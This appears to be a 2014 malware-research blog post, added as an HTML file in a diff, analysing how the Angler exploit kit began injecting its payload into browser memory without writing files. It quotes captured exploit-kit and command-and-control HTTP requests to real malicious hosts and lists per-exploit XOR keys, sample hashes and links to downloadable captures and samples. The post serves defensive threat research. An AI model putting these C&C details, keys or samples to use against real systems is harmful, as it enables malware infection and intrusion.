@@ -1,0 +1,468 @@
+<!doctype html>
+<html class="no-js" lang="en">
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>Angler EK : now capable of &quot;fileless&quot; infection (memory malware) </title>
+
+    <link rel="stylesheet" type="text/css" href="http://malware.dontneedcoffee.com/assets/css/styles_feeling_responsive.css">
+
+  
+
+	<script src="http://malware.dontneedcoffee.com/assets/js/modernizr.min.js"></script>
+
+	<script src="https://ajax.googleapis.com/ajax/libs/webfont/1.5.18/webfont.js"></script>
+	<script>
+		WebFont.load({
+			google: {
+				families: [ 'Lato:400,700,400italic:latin', 'Volkhov::latin' ]
+			}
+		});
+	</script>
+
+	<noscript>
+		<link href='http://fonts.googleapis.com/css?family=Lato:400,700,400italic%7CVolkhov' rel='stylesheet' type='text/css'>
+	</noscript>
+
+
+	<!-- Search Engine Optimization -->
+	<meta name="description" content="Angler EK is able to infect an host without writing the malware on the drive">
+  	
+	
+	
+	
+	
+	<link rel="canonical" href="http://malware.dontneedcoffee.com/2014/08/angler-ek-now-capable-of-fileless.html">
+
+
+	<!-- Facebook Open Graph -->
+	<meta property="og:title" content="Angler EK : now capable of &quot;fileless&quot; infection (memory malware) ">
+	<meta property="og:description" content="Angler EK is able to infect an host without writing the malware on the drive">
+	<meta property="og:url" content="http://malware.dontneedcoffee.com/2014/08/angler-ek-now-capable-of-fileless.html">
+	<meta property="og:locale" content="en_EN">
+	<meta property="og:type" content="website">
+	<meta property="og:site_name" content="MDNC | Malware don't need Coffee">
+	
+	
+
+
+	
+	<!-- Twitter -->
+	<meta name="twitter:card" content="summary">
+	<meta name="twitter:site" content="Kafeine">
+	<meta name="twitter:creator" content="Kafeine">
+	<meta name="twitter:title" content="Angler EK : now capable of &quot;fileless&quot; infection (memory malware) ">
+	<meta name="twitter:description" content="Angler EK is able to infect an host without writing the malware on the drive">
+	
+	
+
+	<link type="text/plain" rel="author" href="http://malware.dontneedcoffee.com/humans.txt">
+
+	
+
+	
+
+	<link rel="icon" sizes="32x32" href="http://malware.dontneedcoffee.com/assets/img/favicon-32x32.png">
+
+	<link rel="icon" sizes="192x192" href="http://malware.dontneedcoffee.com/assets/img/touch-icon-192x192.png">
+
+	<link rel="apple-touch-icon-precomposed" sizes="180x180" href="http://malware.dontneedcoffee.com/assets/img/apple-touch-icon-180x180-precomposed.png">
+
+	<link rel="apple-touch-icon-precomposed" sizes="152x152" href="http://malware.dontneedcoffee.com/assets/img/apple-touch-icon-152x152-precomposed.png">
+
+	<link rel="apple-touch-icon-precomposed" sizes="144x144" href="http://malware.dontneedcoffee.com/assets/img/apple-touch-icon-144x144-precomposed.png">
+
+	<link rel="apple-touch-icon-precomposed" sizes="120x120" href="http://malware.dontneedcoffee.com/assets/img/apple-touch-icon-120x120-precomposed.png">
+
+	<link rel="apple-touch-icon-precomposed" sizes="114x114" href="http://malware.dontneedcoffee.com/assets/img/apple-touch-icon-114x114-precomposed.png">
+
+	
+	<link rel="apple-touch-icon-precomposed" sizes="76x76" href="http://malware.dontneedcoffee.com/assets/img/apple-touch-icon-76x76-precomposed.png">
+
+	<link rel="apple-touch-icon-precomposed" sizes="72x72" href="http://malware.dontneedcoffee.com/assets/img/apple-touch-icon-72x72-precomposed.png">
+
+	<link rel="apple-touch-icon-precomposed" href="http://malware.dontneedcoffee.com/assets/img/apple-touch-icon-precomposed.png">	
+
+	<meta name="msapplication-TileImage" content="http://malware.dontneedcoffee.com/assets/img/msapplication_tileimage.png">
+
+	<meta name="msapplication-TileColor" content="#fabb00">
+
+
+	
+
+</head>
+<body id="top-of-page" class="post">
+	
+	<div id="navigation" class="sticky">
+  <nav class="top-bar" role="navigation" data-topbar>
+    <ul class="title-area">
+      <li class="name">
+      <h1 class="show-for-small-only"><a href="http://malware.dontneedcoffee.com" class="icon-fisticup"> MDNC | Malware don't need Coffee</a></h1>
+    </li>
+       <!-- Remove the class "menu-icon" to get rid of menu icon. Take out "Menu" to just have icon alone -->
+      <li class="toggle-topbar menu-icon"><a href="#"><span>Navigation</span></a></li>
+    </ul>
+    <section class="top-bar-section">
+
+      <ul class="right">
+        
+
+              
+
+          
+          
+        
+
+              
+
+          
+          
+        
+
+              
+
+          
+          
+        
+
+              
+
+          
+          
+            
+            
+              <li class="divider"></li>
+              <li><a href="http://malware.dontneedcoffee.com/search/">Search</a></li>
+
+            
+            
+          
+        
+
+              
+
+          
+          
+            
+            
+              <li class="divider"></li>
+              <li><a href="http://malware.dontneedcoffee.com/faq/">FAQ</a></li>
+
+            
+            
+          
+        
+
+              
+
+          
+          
+            
+            
+              <li class="divider"></li>
+              <li><a href="http://malware.dontneedcoffee.com/contact/">Contact</a></li>
+
+            
+            
+          
+        
+        
+      </ul>
+
+      <ul class="left">
+        
+
+              
+
+          
+          
+
+            
+            
+              <li><a href="http://malware.dontneedcoffee.com/blog/">Blog</a></li>
+              <li class="divider"></li>
+
+            
+            
+          
+        
+
+              
+
+          
+          
+
+            
+            
+              <li><a href="http://malware.dontneedcoffee.com/external/">External</a></li>
+              <li class="divider"></li>
+
+            
+            
+          
+        
+
+              
+
+          
+          
+
+            
+            
+              <li><a href="http://malware.dontneedcoffee.com/blog/archive/">Archive</a></li>
+              <li class="divider"></li>
+
+            
+            
+          
+        
+
+              
+
+          
+          
+        
+
+              
+
+          
+          
+        
+
+              
+
+          
+          
+        
+        
+      </ul>
+    </section>
+  </nav>
+</div><!-- /#navigation -->
+
+	
+
+	
+
+<div id="masthead-no-image-header">
+	<div class="row">
+		<div class="small-6 columns">
+			<a id="logo" href="http://malware.dontneedcoffee.com" title="MDNC | Malware don't need Coffee – You are lost? Hunt for the static dots. You are bored? Find more trackable dots.">
+				<img src="http://malware.dontneedcoffee.com/assets/img/logo.png" alt="MDNC | Malware don't need Coffee – You are lost? Hunt for the static dots. You are bored? Find more trackable dots.">
+			</a>
+		</div><!-- /.small-12.columns -->
+	</div><!-- /.row -->
+</div><!-- /#masthead -->
+
+
+
+
+
+
+
+
+	<div class="row t30">
+	<div class="medium-12 columns medium-offset-2 end">
+		<article itemscope itemtype="http://schema.org/Article">
+			<header>
+				
+
+				<div itemprop="name">
+					<p class="subheadline">2014-08-31  - Evolution</p>
+					<h1>Angler EK : now capable of "fileless" infection (memory malware) </h1>
+				</div>
+			</header>
+
+
+
+			<div itemprop="articleSection">
+			<table align="center" cellpadding="0" cellspacing="0" class="tr-caption-container" style="margin-left: auto; margin-right: auto; text-align: center;"><tbody><tr><td style="text-align: center;"><a href="http://4.bp.blogspot.com/-ypzZNlxUvN8/VAHzIQc9bMI/AAAAAAAADro/YtYcO0obaj0/s1600/1387608205205.gif" imageanchor="1" style="margin-left: auto; margin-right: auto;"><img border="0" height="150" src="http://4.bp.blogspot.com/-ypzZNlxUvN8/VAHzIQc9bMI/AAAAAAAADro/YtYcO0obaj0/s1600/1387608205205.gif" width="200" /></a></td></tr><tr><td class="tr-caption" style="text-align: center;">Matrix - Agent Jackson avoiding bullets</td></tr></tbody></table><div><br /></div><div><br /></div><div><br /></div><div>Few days ago I spotted a new pattern in some Angler EK threads :</div><div><br /></div><div><br /></div><table align="center" cellpadding="0" cellspacing="0" class="tr-caption-container" style="margin-left: auto; margin-right: auto; text-align: center;"><tbody><tr><td style="text-align: center;"><a href="http://3.bp.blogspot.com/-wyQPmV7r2xc/VAHFr9hEwSI/AAAAAAAADq8/ZRokLlA3e9o/s1600/screenshot_2014-08-30_008.png" imageanchor="1" style="margin-left: auto; margin-right: auto;"><img border="0" height="30" src="http://3.bp.blogspot.com/-wyQPmV7r2xc/VAHFr9hEwSI/AAAAAAAADq8/ZRokLlA3e9o/s1600/screenshot_2014-08-30_008.png" width="640" /></a></td></tr><tr><td class="tr-caption" style="text-align: center;">New pattern in a Vawtrak Thread from Angler EK<br />Fired : CVE-2013-2551 - 2014-08-28</td></tr></tbody></table><div><br /></div><div><br /></div><table align="center" cellpadding="0" cellspacing="0" class="tr-caption-container" style="margin-left: auto; margin-right: auto; text-align: center;"><tbody><tr><td style="text-align: center;"><a href="http://1.bp.blogspot.com/-WBFf0GHDH2c/VAG9PcX8LRI/AAAAAAAADqc/briDKPfR61E/s1600/screenshot_2014-08-30_006.png" imageanchor="1" style="margin-left: auto; margin-right: auto;"><img border="0" height="50" src="http://1.bp.blogspot.com/-WBFf0GHDH2c/VAG9PcX8LRI/AAAAAAAADqc/briDKPfR61E/s1600/screenshot_2014-08-30_006.png" width="640" /></a></td></tr><tr><td class="tr-caption" style="text-align: center;">New pattern in another Vawtrak Thread from Angler EK<br />Fired : CVE-2014-0515 - 2014-08-29</td></tr></tbody></table><div><div><span style="color: #351c75;">GET http://rwvs30r2zq.akdnbfb .com/qpbv8tg4ee/count?b=1 HTTP/1.1</span></div><div><span style="color: #351c75;">Accept: */*</span></div><div><span style="color: #351c75;">Referer: http://rwvs30r2zq.akdnbfb .com/qpbv8tg4ee</span></div><div><span style="color: #351c75;">Accept-Language: en-us</span></div><div><span style="color: #351c75;">User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET4.0C; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)</span></div><div><span style="color: #351c75;">Accept-Encoding: gzip, deflate</span></div><div><span style="color: #351c75;">Host: rwvs30r2zq.akdnbfb.com</span></div><div><span style="color: #351c75;">Connection: Keep-Alive</span></div></div><div><br /></div><div><br /></div><div><br /></div><div>Wondering what it was and going over different infections paths I spotted only one thread without this "new" count?b. &nbsp;[Note : on the 2014-08-31 count?b appeared on that thread too]</div><div><br /></div><table align="center" cellpadding="0" cellspacing="0" class="tr-caption-container" style="margin-left: auto; margin-right: auto; text-align: center;"><tbody><tr><td style="text-align: center;"><a href="http://2.bp.blogspot.com/-ozR4hwQdMB0/VAHFO9j40cI/AAAAAAAADq0/Y3UjAwxttxQ/s1600/screenshot_2014-08-30_007.png" imageanchor="1" style="margin-left: auto; margin-right: auto;"><img border="0" height="30" src="http://2.bp.blogspot.com/-ozR4hwQdMB0/VAHFO9j40cI/AAAAAAAADq0/Y3UjAwxttxQ/s1600/screenshot_2014-08-30_007.png" width="640" /></a></td></tr><tr><td class="tr-caption" style="text-align: center;">Angler EK - 2014-08-28<br />"Memory Malware" thread</td></tr></tbody></table><div><br /></div><div><br /></div><div>Exploits' hashes were the same as on all other threads but my usual tools were not able to gather the payload and what surprised me more is that HIPS (like Faronics antiexec) were bypassed (note : I tried Malwarebytes AntiExploit and it was able to spot the ROP and Stack pivoting)</div><div>I spent some time to figure out what was happening here &nbsp;:</div><div><br /></div><div><b>Angler EK is now able to infect an host without writing the malware on the drive</b> (it's injected directly in the process running the exploited plugin)</div><div><br /></div><table align="center" cellpadding="0" cellspacing="0" class="tr-caption-container" style="margin-left: auto; margin-right: auto; text-align: center;"><tbody><tr><td style="text-align: center;"><a href="http://3.bp.blogspot.com/-tk-0aVCBrnQ/VAHCFdA_OlI/AAAAAAAADqo/JN93qpLyjhU/s1600/screenshot_2014-08-29_010.png" imageanchor="1" style="margin-left: auto; margin-right: auto;"><img border="0" height="270" src="http://3.bp.blogspot.com/-tk-0aVCBrnQ/VAHCFdA_OlI/AAAAAAAADqo/JN93qpLyjhU/s1600/screenshot_2014-08-29_010.png" width="640" /></a></td></tr><tr><td class="tr-caption" style="text-align: center;">Angler EK (no landing on this screen, CVE-2014-0515 fired) and Call back from the malware injected in Internet Explorer<br />2nd Stage drop :&nbsp;<span style="font-size: x-small;"><a href="https://www.virustotal.com/file/f5bbd31896fce7175292139dc54305067805ae82bb800a770baaf0e18eb6f15b/analysis/">275c5f650261e80d864faf7cc6b70774</a> injecting itself to explorer and</span><br /><span style="font-size: x-small;">then gathering Necurs on the same C&amp;C (e.g. : <a href="https://www.virustotal.com/file/b66a24dec989369fe96ba2179d8351fd2f6c96b8ea2f6e06bed265b00d06e48a/analysis/">be84c4689912d5689283b4b7efcaf8f2</a> - 2014-08-28 ,&nbsp;<a href="https://www.virustotal.com/file/4c2756b101cc1b6beaa5fcc33acbc723269da901e87ab0dd7cc774f0b98f5d2c/analysis/">b0e3e860a2dc62cb40fd6ef897ad592b</a> 2014-08-29 ,&nbsp;<a href="https://www.virustotal.com/file/d7e0593d9d0e6030140662c57bf0ddeefc7f057dfa5d7c02a6d69c82336cec1e/analysis/1409412592/">5830dfde30873176d05604677bab6bd9</a> 2014-08-30</span><span style="font-size: x-small;">)</span></td><td class="tr-caption"><br /></td><td class="tr-caption"><br /></td></tr></tbody></table><div><table align="center" cellpadding="0" cellspacing="0" class="tr-caption-container" style="margin-left: auto; margin-right: auto; text-align: center;"><tbody><tr><td><a href="http://1.bp.blogspot.com/-cXL8tN5cDaE/VAleAufg4XI/AAAAAAAADtE/8hGbLoTEwDk/s1600/screenshot_2014-09-02_013.png" imageanchor="1" style="margin-left: auto; margin-right: auto;"><img border="0" height="392" src="http://1.bp.blogspot.com/-cXL8tN5cDaE/VAleAufg4XI/AAAAAAAADtE/8hGbLoTEwDk/s1600/screenshot_2014-09-02_013.png" width="640" /></a></td></tr><tr><td class="tr-caption" style="font-size: 13.3333339691162px;">FileReplaceA "flood" operation</td></tr></tbody></table><br />Malware call back in https to koqpisea.in :</div><div>217.23.3.204</div><div>49981 | 217.23.0.0/20 | WORLDSTREAM | NL | WORLDSTREAM.NL | WORLDSTREAM</div><div><br /></div><div>Call for 2nd Stage payload looks like :</div><div><br /></div><div><div><span style="color: #351c75;">POST https://koqpisea.in/ HTTP/1.1</span></div><div><span style="color: #351c75;">Host: koqpisea.in</span></div><div><span style="color: #351c75;">Content-Length: 94</span></div><div><span style="color: #351c75;">Connection: Keep-Alive</span></div><div><span style="color: #351c75;">Cache-Control: no-cache</span></div><div><span style="color: #351c75;"><br /></span></div><div><span style="color: #351c75;">{"protocolVersion":1,"buildId":1049,"id":"35d1754a1c4672f2","tags":[{"type":"dll","64bit":0}]}</span></div></div><div><br /></div><div><br /></div><div>This feature opens a wide range of possibilities. Aside being a powerful way to bypass some AV, an ideal way for one time stealer or loader (<a href="http://malware.dontneedcoffee.com/2012/06/inside-pony-17.html">Pony</a>, <a href="http://malware.dontneedcoffee.com/2013/10/jolly-roger-stealer-c-panel.html">Jolly Roger</a>, <a href="http://malware.dontneedcoffee.com/2012/07/inside-andromeda-bot-v206-webpanel-aka.html">Andromeda</a>, <a href="http://malware.dontneedcoffee.com/2012/04/inside-smoke-bot.html">Smoke Bot</a>, etc..), it also allows a detailed check of the infected host before being a little more noisy and writing anything on disk. It makes it also difficult to grab the dropper (you have to get it from the memory or from the recorded traffic then decode it). This is a powerful move for the attack side.</div><div><br /></div><div><br /></div><div>Additional illustrations :</div><div><br /></div><table align="center" cellpadding="0" cellspacing="0" class="tr-caption-container" style="margin-left: auto; margin-right: auto; text-align: center;"><tbody><tr><td style="text-align: center;"><a href="http://2.bp.blogspot.com/-aO3e47FCTuA/VAHupvysbWI/AAAAAAAADrg/-kuDi67PS80/s1600/screenshot_2014-08-30_016.png" imageanchor="1" style="margin-left: auto; margin-right: auto;"><img border="0" height="70" src="http://2.bp.blogspot.com/-aO3e47FCTuA/VAHupvysbWI/AAAAAAAADrg/-kuDi67PS80/s1600/screenshot_2014-08-30_016.png" width="640" /></a></td></tr><tr><td class="tr-caption" style="text-align: center;">Injected plugin-container calling C&amp;C after successful "memory malware" infection<br />via Silverlight on Firefox and Windows 7<br />2014-08-30</td></tr></tbody></table><div><br /></div><div><br /></div><div><br /></div><table align="center" cellpadding="0" cellspacing="0" class="tr-caption-container" style="margin-left: auto; margin-right: auto; text-align: center;"><tbody><tr><td style="text-align: center;"><a href="http://2.bp.blogspot.com/-rn8n-wiV31A/VAHJkPGAWBI/AAAAAAAADrE/Gj6ychI3aPk/s1600/not4lu.jpg" imageanchor="1" style="margin-left: auto; margin-right: auto;"><img border="0" height="288" src="http://2.bp.blogspot.com/-rn8n-wiV31A/VAHJkPGAWBI/AAAAAAAADrE/Gj6ychI3aPk/s1600/not4lu.jpg" width="640" /></a></td></tr><tr><td class="tr-caption" style="text-align: center;">Image : Courtesy of <a href="https://twitter.com/node5">Will Metcalf</a> from Emerging Threats<br />Java calling payload then "Memory payload" activity captured by his Cuckoo instance<br />2014-08-28</td></tr></tbody></table><div>&lt;edit &gt;<br /><br />The encoded stream that is usually containing the <a href="http://malware.dontneedcoffee.com/2014/02/cve-2014-0497-flash-up-to-120043.html">Xored + shift byte</a> malware is different in this configuration.<br /><br />In Angler each exploit has its own Xor key :<br /><br /><table align="center" cellpadding="0" cellspacing="0" class="tr-caption-container" style="margin-left: auto; margin-right: auto; text-align: center;"><tbody><tr><td style="text-align: center;"><a href="http://4.bp.blogspot.com/-yb32nZxlmBA/VAlbgGrcnsI/AAAAAAAADsw/dq_3WcoBn6s/s1600/screenshot_2014-09-02_009.png" imageanchor="1" style="margin-left: auto; margin-right: auto;"><img border="0" height="450" src="http://4.bp.blogspot.com/-yb32nZxlmBA/VAlbgGrcnsI/AAAAAAAADsw/dq_3WcoBn6s/s1600/screenshot_2014-09-02_009.png" width="640" /></a></td></tr><tr><td class="tr-caption" style="text-align: center;">Xor key in Angler &nbsp;"fileless" thread CVE-2014-0515 stream&nbsp;</td></tr></tbody></table><br /><br />CVE-2013-2551 = "adR2b4nh"<br />CVE-2014-0515 = "wT6QtySY"<br />CVE-2014-0322 = "laspfnfd"<br />Java = "FroSHu9h"<br />Silverlight = "aldonjfg"<br /><br />The stream now starts with a Xored Shellcode (which has been spotted by&nbsp;<a href="https://twitter.com/EKWatcher">EKWatcher</a>&nbsp;as early as 2014-08-18 in thread fed by Adnxs (app Nexus) malvertising )<br /><br /><table align="center" cellpadding="0" cellspacing="0" class="tr-caption-container" style="margin-left: auto; margin-right: auto; text-align: center;"><tbody><tr><td style="text-align: center;"><a href="http://3.bp.blogspot.com/-fM-9L7bKDTQ/VAlcY1eISFI/AAAAAAAADs4/CI6D9Kpm66o/s1600/screenshot_2014-09-01_002.png" imageanchor="1" style="margin-left: auto; margin-right: auto;"><img border="0" height="493" src="http://3.bp.blogspot.com/-fM-9L7bKDTQ/VAlcY1eISFI/AAAAAAAADs4/CI6D9Kpm66o/s1600/screenshot_2014-09-01_002.png" width="640" /></a></td></tr><tr><td class="tr-caption" style="text-align: center;">32 bits version of the stream after a XOR pass.<br />First part is a Shellcode.<br />Second part is a Dll</td></tr></tbody></table>After a Xor and split operation (Disclaimer : <span style="font-size: x-small;">it could be not enough to get the real DLL as Angler has an history of doing more than just a Xor</span>)<br /><br /><a href="http://www.onlinedisassembler.com/odaweb/aeKMdI#view/tab-assembly/offset/00000000">Stream Shellcode 32bits</a><br /><span style="background-color: white; color: #333333; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; font-size: 13px; line-height: 20px;">Xored MZ part :&nbsp;<a href="https://www.virustotal.com/en/file/6d0ec3400aa0999b944792259ad5e92e03dc689c13a0f8b617fad58c588d9575/analysis/1409587872/">32f4a876c1819713d13e1d14d8cb0a02</a></span><br /><br />That encoded DLL is the same threat as the one called after infection (waiting for a proper name by AV). String spotted : C:\Remedies\And.pdb<br /><br />&nbsp;<a href="https://twitter.com/dsanchezlavado">David Sanchez</a>&nbsp;(Malwarebytes)&nbsp;figured out that the payload is hooking the kernel32!Exit!Process.<br />explaining why Iexplore was still loaded when browser was closed.<br /><br />If the victim's OS is 64 bits then a 64bits shellcode and 64bits version of the dll is being sent :<br /><br /><table align="center" cellpadding="0" cellspacing="0" class="tr-caption-container" style="margin-left: auto; margin-right: auto; text-align: center;"><tbody><tr><td style="text-align: center;"><a href="http://2.bp.blogspot.com/-iKG95pySNuI/VAlirXkj3MI/AAAAAAAADtQ/B5VhmOgFzbk/s1600/screenshot_2014-09-05_008.png" imageanchor="1" style="margin-left: auto; margin-right: auto;"><img border="0" height="190" src="http://2.bp.blogspot.com/-iKG95pySNuI/VAlirXkj3MI/AAAAAAAADtQ/B5VhmOgFzbk/s1600/screenshot_2014-09-05_008.png" width="640" /></a></td></tr><tr><td class="tr-caption" style="text-align: center;">Angler EK 2014-09-04&nbsp;In bold Green :<br />- Encoded stream<br />- Same Distribution threat as the encoded one, downloaded from the C&amp;C<br />- Asterope</td></tr></tbody></table><br />Unamed Distribution bot (64bits variant) : <a href="https://www.virustotal.com/fr/file/cde27e6bd00520fe643ad0b627c87ecfdd6a850db5e7e4b8a964a93c17c03c22/analysis/1409901697/">1b4cbec2a2d634ae257a760d43ba6bc5</a><br /><div><br /></div>It seems that the call back C&amp;C &nbsp;is operated by the Angler EK guys and is a kind of "Distribution botnet" (or loader in "Caas" mode)<br />&lt;/edit&gt;</div><div><b><u><br /></u></b></div><div><b><u>Credits:</u></b> Thanks to <a href="https://twitter.com/node5">Will Metcalf</a> (Emerging Threats) and <a href="https://twitter.com/miekiemoes">Mieke Verburgh</a> (Malwarebytes) for help and advices.<br />Thanks to <a href="https://twitter.com/EKWatcher">EkWatcher</a> and <a href="https://twitter.com/dsanchezlavado">David Sanchez</a> (Malwarebytes) for informations and an insight on the "RE" side of this thread</div><div><br /></div><div><b><u>Files:</u></b><br />&nbsp;<a href="https://files.dontneedcoffee.com/index.php/s/7f197636fca3e447a4d1800e0c11bcf2">AnglerEK_MM_2014-08-31</a> (Fiddlers + bot + C&amp;C calls - <span style="font-size: xx-small;">Owncloud</span>)<br />&nbsp;<a href="https://files.dontneedcoffee.com/index.php/s/d1568f4de4e2f8d54dd113480f155d72">AnglerEK_MM_2014-09-05</a>&nbsp;(2addionnal fiddler, 64bits streams and C&amp;C callback&nbsp;-&nbsp;<span style="font-size: xx-small;">Owncloud</span>)<br /><br />&nbsp;If you want to play with Volatility or whatever, <a href="https://mega.co.nz/#!tNIHSZoS!fi0YrMYcT3lr6vf2I-Qqu-C_Uw0-UPcDwxJq23XQoIM">here is the memory</a>&nbsp;<span style="font-size: xx-small;">(Mega)</span> of a VM when IE was injected and calling C&amp;C (IE pid : 860)</div><div><br /></div><table align="center" cellpadding="0" cellspacing="0" class="tr-caption-container" style="margin-left: auto; margin-right: auto; text-align: center;"><tbody><tr><td style="text-align: center;"><a href="http://2.bp.blogspot.com/-15gOyWeAS04/VAHX1opJJCI/AAAAAAAADrQ/5BLqHsCfY4k/s1600/screenshot_2014-08-30_013.png" imageanchor="1" style="margin-left: auto; margin-right: auto;"><img border="0" height="122" src="http://2.bp.blogspot.com/-15gOyWeAS04/VAHX1opJJCI/AAAAAAAADrQ/5BLqHsCfY4k/s1600/screenshot_2014-08-30_013.png" width="640" /></a></td></tr><tr><td class="tr-caption" style="text-align: center;">Capture of Fiddler just before pausing the VM<br />2014-08-30</td></tr></tbody></table><div>&lt;edit 2014-09-26&gt;<br /><blockquote class="twitter-tweet" lang="en">That was inevitable, this is happening. Filess Poweliks meets Filess Angler EK thread. Combo ! <a href="http://t.co/5mobHrlt27">pic.twitter.com/5mobHrlt27</a><br />— kafeine (@kafeine) <a href="https://twitter.com/kafeine/status/515527952059351040">September 26, 2014</a></blockquote><script async="" charset="utf-8" src="//platform.twitter.com/widgets.js"></script>&lt;/edit&gt;<br /><br /><br />&lt;edit 2014-09-29&gt;<br /><br /><blockquote class="twitter-tweet" lang="en">Bedep ! The distribution botnet tied to most of the fileless Angler EK threads has a name now ! Thx <a href="https://twitter.com/ESET">@eset</a> <a href="http://t.co/Sw2a8sxgfS">pic.twitter.com/Sw2a8sxgfS</a><br />— kafeine (@kafeine) <a href="https://twitter.com/kafeine/status/516607065541054464">September 29, 2014</a></blockquote><script async="" charset="utf-8" src="//platform.twitter.com/widgets.js"></script> &lt;/edit&gt;</div><div><br /></div><div><br /></div><div><b><u>Read More:</u></b> &nbsp;</div><div><a href="http://resources.infosecinstitute.com/the-hunt-for-memory-malwares/">The Hunt for Memory Malware</a> - 2013-11-06 - Albert Fruz</div><div><a href="http://securityxploded.com/memory-execution-of-executable.php">In-Memory Execution of an Executable</a> -&nbsp;Amit Malik &nbsp;- SecurityXploded<br /><a href="http://securelist.com/blog/virus-watch/32383/a-unique-bodiless-bot-attacks-news-site-visitors-3/">A unique 'bodiless' bot attacks news site visitors</a>&nbsp;- 2012-03-06 Segey Golovanov - Securelist</div><div><br /></div><div><br /></div><div><br /></div>
+			</div>
+
+			
+						<div id="page-meta" class="t30">
+				<p>
+					<!-- Look the author details up from the site config. -->
+					
+					<!-- Output author details if some exist. -->
+					
+					<span itemprop="author" itemscope itemtype="http://schema.org/Person"><span itemprop="name" class="pr20 icon-edit"><a href="https://twitter.com/kafeine" target="_blank"> Kafeine</a></span>
+				</span>
+				
+
+				
+				<time class="icon-calendar pr20" datetime="2014-08-31" itemprop="datePublished"> 2014-08-31</time>
+				
+
+				<span class="icon-archive pr20"> EXPLOIT-KIT</span>
+				<br />
+				<span class="pr20"><span class="icon-price-tag pr10"> memory malware</span> <span class="icon-price-tag pr10"> Angler EK</span> </span>
+			</p>
+
+			<div id="post-nav" class="row">
+				
+				<div class="small-5 columns"><a class="button small radius prev" href="http://malware.dontneedcoffee.com/2014/08/scarepackageknstant.html">&laquo; A ScarePakage variant is targeting more countries :  impersonating Europol and AFP</a></div><!-- /.small-4.columns -->
+				
+				<div class="small-2 columns text-center"><a class="radius button small" href="http://malware.dontneedcoffee.com/blog/archive/" title="Blog Archive">Archive</a></div><!-- /.small-4.columns -->
+				
+				<div class="small-5 columns text-right"><a class="button small radius next" href="http://malware.dontneedcoffee.com/2014/09/astrum-ek.html">Say Hello to Astrum EK &raquo;</a></div><!-- /.small-4.columns -->
+				
+			</div>
+			</div><!--  /.page-meta -->
+			
+
+			
+		</article>
+	</div><!-- /.medium-8.columns -->
+
+
+	
+
+
+	
+</div><!-- /.row -->
+
+
+	
+	    <div id="up-to-top" class="row">
+      <div class="small-12 columns" style="text-align: right;">
+        <a class="iconfont" href="#top-of-page">&#xf108;</a>
+      </div><!-- /.small-12.columns -->
+    </div><!-- /.row -->
+
+
+    <footer id="footer-content" class="bg-grau">
+      <div id="footer">
+        <div class="row">
+          <div class="medium-6 large-5 columns">
+            <h5 class="shadow-black"></h5>
+
+            <p class="shadow-black">
+              Sleep is a symptom of caffeine deprivation.
+            </p>
+          </div><!-- /.large-6.columns -->
+
+
+          <div class="small-6 medium-3 large-3 large-offset-1 columns">
+            
+              
+                <h5 class="shadow-black">Services</h5>
+              
+            
+              
+            
+              
+            
+              
+            
+              
+            
+
+              <ul class="no-bullet shadow-black">
+              
+                
+                  <li >
+                    <a href="http://malware.dontneedcoffee.com"  title=""></a>
+                  </li>
+              
+                
+                  <li >
+                    <a href="http://malware.dontneedcoffee.com/contact/"  title="Contact">Contact</a>
+                  </li>
+              
+                
+                  <li >
+                    <a href="http://malware.dontneedcoffee.com/feed.xml"  title="Subscribe to RSS Feed">RSS</a>
+                  </li>
+              
+                
+                  <li >
+                    <a href="http://malware.dontneedcoffee.com/atom.xml"  title="Subscribe to Atom Feed">Atom</a>
+                  </li>
+              
+                
+                  <li >
+                    <a href="http://malware.dontneedcoffee.com/sitemap.xml"  title="Sitemap for Google Webmaster Tools">sitemap.xml</a>
+                  </li>
+              
+              </ul>
+          </div><!-- /.large-4.columns -->
+
+
+          <div class="small-6 medium-3 large-3 columns">
+            
+              
+                <h5 class="shadow-black">Merci</h5>
+              
+            
+              
+            
+              
+            
+
+            <ul class="no-bullet shadow-black">
+            
+              
+                <li >
+                  <a href="http://malware.dontneedcoffee.com"  title=""></a>
+                </li>
+            
+              
+                <li class="network-misp" >
+                  <a href="https://www.misp-project.org/" target="_blank"  title="MISP Project - Open Source Threat Intelligence Platform & Open Standards For Threat Information Sharing">MISP</a>
+                </li>
+            
+              
+                <li class="network-cuckoo" >
+                  <a href="https://cuckoosandbox.org/" target="_blank"  title="Automate Malware Analysis">Cuckoo</a>
+                </li>
+            
+            </ul>
+          </div><!-- /.large-3.columns -->
+        </div><!-- /.row -->
+
+      </div><!-- /#footer -->
+
+
+      <div id="subfooter">
+        <nav class="row">
+          <section id="subfooter-left" class="small-12 medium-6 columns credits">
+            
+          </section>
+
+          <section id="subfooter-right" class="small-12 medium-6 columns">
+            <ul class="inline-list social-icons">
+            
+              <li><a href="http://github.com/Kafeine" target="_blank" class="icon-github" title="Code and more..."></a></li>
+            
+              <li><a href="http://twitter.com/Kafeine" target="_blank" class="icon-twitter" title="Last tweets"></a></li>
+            
+            </ul>
+          </section>
+        </nav>
+      </div><!-- /#subfooter -->
+    </footer>
+
+	
+
+	
+
+
+<script src="http://malware.dontneedcoffee.com/assets/js/javascript.min.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
+
